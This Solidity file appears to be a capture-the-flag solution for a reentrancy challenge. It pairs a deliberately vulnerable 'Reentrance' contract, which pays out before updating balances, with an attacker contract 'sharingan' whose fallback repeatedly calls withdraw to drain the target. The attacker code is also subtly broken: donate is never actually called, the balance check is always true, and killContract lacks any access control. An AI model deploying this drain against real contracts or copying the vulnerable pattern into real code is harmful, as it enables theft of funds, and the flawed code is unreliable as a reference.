// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract sharingan {
    Reentrance con;
    
    constructor (address payable _target) public {
        con = Reentrance(_target);
    }
    
    function mix() public payable {
        con.donate{value: 1 ether};
        con.withdraw(1 ether);
    }
    
    fallback() external payable {
        if (address(con).balance >= 0 ether) {
         con.withdraw(address(con).balance);   
        }
        
    }
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function killContract() public {
        selfdestruct(msg.sender);
    }
}
